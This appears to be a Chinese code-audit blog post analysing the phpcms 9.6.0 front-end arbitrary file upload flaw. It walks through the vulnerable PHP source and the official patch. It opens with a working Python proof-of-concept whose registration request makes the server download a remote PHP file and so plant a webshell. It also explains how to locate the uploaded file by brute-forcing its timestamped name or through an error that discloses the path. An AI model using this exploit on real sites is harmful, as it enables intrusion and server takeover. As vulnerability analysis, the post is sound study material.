# 前言
上一节我们分析了phpcms的后台get shell， 但是众所周知， 开发者对后台的漏洞
是不太上心的。因为管理员账号一般只有网站所有者才会有，如果入侵者能获取到管理员
账号，那么基本上意味着网站的所有信息都为他打开了大门，后台漏洞也就不那么重要了。  
那么今天要分析的是phpccms 9.6.0版本的前台get shell. 漏洞的利用方式极其简单。
但是相对而言，代码的漏洞实现逻辑就没有前一篇文章那么简易明了了。

# POC
先看一下POC：  
```
import re
import requests

def poc(url):
    u = '{}/index.php?m=member&c=index&a=register&siteid=1'.format(url)
    data = {
        'siteid': '1',
        'modelid': '1',
        'username': 'test',
        'password': 'testxx',
        'email': 'test@test.com',
        'info[content]': '<img src=http://ip/one.txt.php#.jpg>',
        'dosubmit': '1',
    }
    rep = requests.post(u, data=data)
```

# 漏洞分析
poc非常简单。如果对phpcms有基本的了解的话，可以从url里看出，这其实就是会员的注册
操作。   
好的，那么到phpcms/modules/member/index.php 找到register函数， 一路看下来，
一直到：  
```
if($member_setting['choosemodel']) {
    require_once CACHE_MODEL_PATH.'member_input.class.php';
    require_once CACHE_MODEL_PATH.'member_update.class.php';
    $member_input = new member_input($userinfo['modelid']);		
    $_POST['info'] = array_map('new_html_special_chars',$_POST['info']);
    $user_model_info = $member_input->get($_POST['info']);				        				
}
```
我们看到$_POST['info']在这里被处理过了， 跟进到"new_html_special_chars"函数：  
phpcms/libs/functions/global.func.php 第37行
```
function new_html_special_chars($string) {
	$encoding = 'utf-8';
	if(strtolower(CHARSET)=='gbk') $encoding = 'ISO-8859-15';
	if(!is_array($string)) return htmlspecialchars($string,ENT_QUOTES,$encoding);
	foreach($string as $key => $val) $string[$key] = new_html_special_chars($val);
	return $string;
}
```
可以看出， 函数对$_POST['info']进行了html实体转换处理。  
好，到下一行， 跳转到$member_input->get函数:  
caches/caches_model/caches_data/member_input.class.php 20行  
```
function get($data) {
    $this->data = $data = trim_script($data);
    $model_cache = getcache('member_model', 'commons');
    $this->db->table_name = $this->db_pre.$model_cache[$this->modelid]['tablename'];

    $info = array();
    $debar_filed = array('catid','title','style','thumb','status','islink','description');
    if(is_array($data)) {
        foreach($data as $field=>$value) {
            if($data['islink']==1 && !in_array($field,$debar_filed)) continue;
            $field = safe_replace($field);
            $name = $this->fields[$field]['name'];
            $minlength = $this->fields[$field]['minlength'];
            $maxlength = $this->fields[$field]['maxlength'];
            $pattern = $this->fields[$field]['pattern'];
            $errortips = $this->fields[$field]['errortips'];
            if(empty($errortips)) $errortips = "$name 不符合要求！";
            $length = empty($value) ? 0 : strlen($value);
            if($minlength && $length < $minlength && !$isimport) showmessage("$name 不得少于 $minlength 个字符！");
            if (!array_key_exists($field, $this->fields)) showmessage('模型中不存在'.$field.'字段');
            if($maxlength && $length > $maxlength && !$isimport) {
                showmessage("$name 不得超过 $maxlength 个字符！");
            } else {
                str_cut($value, $maxlength);
            }
            if($pattern && $length && !preg_match($pattern, $value) && !$isimport) showmessage($errortips);
            if($this->fields[$field]['isunique'] && $this->db->get_one(array($field=>$value),$field) && ROUTE_A != 'edit') showmessage("$name 的值不得重复！");
            $func = $this->fields[$field]['formtype'];
            if(method_exists($this, $func)) $value = $this->$func($field, $value);

            $info[$field] = $value;
        }
    }
    return $info;
}
```
可以看到这个函数主要对注册的字段进行了一些限制，如果不符合的话就返回“操作失败”。
一直到这一行：  
```
$func = $this->fields[$field]['formtype'];
if(method_exists($this, $func)) $value = $this->$func($field, $value);
```
说实话这里确实不太好懂，特别是对我这种对php不太熟悉的人来说。不过可以大概看出它是判断此类
有没有这个函数，如果有的话就执行。再看下$this->fields从哪儿来：  
```
 function __construct($modelid) {
    $this->db = pc_base::load_model('sitemodel_field_model');
    $this->db_pre = $this->db->db_tablepre;
    $this->modelid = $modelid;
    $this->fields = getcache('model_field_'.$modelid,'model');
    }
```
在构造函数里面， getcache是从某个数据库model实例化的文件取出值来。那么去找原始的数据库语句，
在install_package/install/main/phpcms_db.sql里面， 找到"model_field_":  
![sql](https://raw.githubusercontent.com/greatyy/codeAudit/master/codeaudit101/phpcms%20v9.6.0%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/sql.PNG)
再找到field对应为content的一行，可以看到对应的formtype是"editor"。(此处应该有更简单的查看方法。另外install文件夹在装完网站之后就没了，
应该到下载源码去看。)  
那么查看此类的editor方法:  
```
function editor($field, $value) {
    $setting = string2array($this->fields[$field]['setting']);
    $enablesaveimage = $setting['enablesaveimage'];
    $site_setting = string2array($this->site_config['setting']);
    $watermark_enable = intval($site_setting['watermark_enable']);
    $value = $this->attachment->download('content', $value,$watermark_enable);
    return $value;
}
```
哈哈，看到一个熟悉的函数"string2array",可惜参数不可控，不然又是一个代码执行。（这么简单的话早被人发现了。。）。
好，跳转到$this->attachment->download函数：  
phpcms/libs/classes/attachment.class.php 143行
```
function download($field, $value,$watermark = '0',$ext = 'gif|jpg|jpeg|bmp|png', $absurl = '', $basehref = ''){
    global $image_d;
    $this->att_db = pc_base::load_model('attachment_model');
    $upload_url = pc_base::load_config('system','upload_url');
    $this->field = $field;
    $dir = date('Y/md/');
    $uploadpath = $upload_url.$dir;
    $uploaddir = $this->upload_root.$dir;
    $string = new_stripslashes($value);
    if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)) return $value;
    $remotefileurls = array();
    foreach($matches[3] as $matche)
    {
        if(strpos($matche, '://') === false) continue;
        dir_create($uploaddir);
        $remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);
    }
    unset($matches, $string);
    $remotefileurls = array_unique($remotefileurls);
    $oldpath = $newpath = array();
    foreach($remotefileurls as $k=>$file) {
        if(strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue;
        $filename = fileext($file);
        $file_name = basename($file);
        $filename = $this->getname($filename);

        $newfile = $uploaddir.$filename;
        $upload_func = $this->upload_func;
        if($upload_func($file, $newfile)) {
            $oldpath[] = $k;
            $GLOBALS['downloadfiles'][] = $newpath[] = $uploadpath.$filename;
            @chmod($newfile, 0777);
            $fileext = fileext($filename);
            if($watermark){
                watermark($newfile, $newfile,$this->siteid);
            }
            $filepath = $dir.$filename;
            $downloadedfile = array('filename'=>$filename, 'filepath'=>$filepath, 'filesize'=>filesize($newfile), 'fileext'=>$fileext);
            $aid = $this->add($downloadedfile);
            $this->downloadedfiles[$aid] = $filepath;
        }
    }
    return str_replace($oldpath, $newpath, $value);
}	
```
函数的大概功能是把对应url的文件下载下来，并且保存到本地。这是一个危险的操作，如果下载的是
可执行文件的话，分分钟就get shell啊。事实上这个漏洞的原理就是这样！先看下这行：
```
if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'>]+\.($ext))\\2/i", $string, $matches)) return $value;
```
开发者希望我们传的参数时这样的: `<img src='http://www.baidu.com/1.jpg'>`,必须要由图片格式结尾。
接着这行:  
```
$remotefileurls[$matche] = $this->fillurl($matche, $absurl, $basehref);
```
则去除了"#"之后的内容。现在回头看看我们的POC， `<img src=http://ip/one.txt.php#.jpg>`到这一步之后
变成了"http://ip/one.txt.php" ，之后的代码则是将此外部文件下载并重命名， 当然，格式还是我们想要的
php格式。  
现在还剩下最后一个问题， 该文件的名字我们该怎么得到？看一下是怎么命名的：  
```
function getname($fileext){
    return date('Ymdhis').rand(100, 999).'.'.$fileext;
}
```
年月日时分秒再加三位数字嘛，遍历一下即可。  
当然还有一个不要遍历的方法。我们再回到register函数：  
phpcms/modules/member/index.php 138行
```
$this->_init_phpsso();
$status = $this->client->ps_member_register($userinfo['username'], $userinfo['password'], $userinfo['email'], $userinfo['regip'], $userinfo['encrypt']);
if($status > 0) {
    $userinfo['phpssouid'] = $status;
    //传入phpsso为明文密码，加密后存入phpcms_v9
    $password = $userinfo['password'];
    $userinfo['password'] = password($userinfo['password'], $userinfo['encrypt']);
    $userid = $this->db->insert($userinfo, 1);
    if($member_setting['choosemodel']) {	//如果开启选择模型
        $user_model_info['userid'] = $userid;
        //插入会员模型数据
        $this->db->set_model($userinfo['modelid']);
        $this->db->insert($user_model_info);
    }
```
可以看到$status大于0时插入数据库`v9_member_detail`表，但是此表没有content字段，所以会报错，爆出路径：  
![path](https://raw.githubusercontent.com/greatyy/codeAudit/master/codeaudit101/phpcms%20v9.6.0%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/imgs/path.PNG)
那么如何保证$status 大于0呢？查看代码:  
phpcms/modules/member/classes/client.class.php 17行
```
/**
 * 用户注册
 * @param string $username 	用户名
 * @param string $password 	密码
 * @param string $email		email
 * @param string $regip		注册ip
 * @param string $random	密码随机数
 * @return int {-1:用户名已经存在 ;-2:email已存在;-3:email格式错误;-4:用户名禁止注册;-5:邮箱禁止注册；int(uid):成功}
 */
public function ps_member_register($username, $password, $email, $regip='', $random='') {
    if(!$this->_is_email($email)) {
        return -3;
    }
     
    return $this->_ps_send('register', array('username'=>$username, 'password'=>$password, 'email'=>$email, 'regip'=>$regip, 'random'=>$random));
}
```
可以看到基本上用户名和邮箱不重复就行。

# 官方修复
![patch](https://images.seebug.org/content/images/2017/04/pic/patch.png-w331s)  
在获取文件扩展名后再对扩展名进行检测

# 碎碎念
phpcms 9.6.0版本在2016年2月25日上线，一直到2017年04月10日这个漏洞才被正式披露。
它并没有很长的漏洞利用链，说明即使是大众软件也很可能存在不那么难的高危漏洞的嘛。
当然，这也可能是我已经知道了谜底反推谜面的原因。代码审计的漏洞利用像是侦探小说
的杀人手法一样，推开重重迷雾，找到不唯一的可能，只有最厉害的侦探才能做到。（大雾）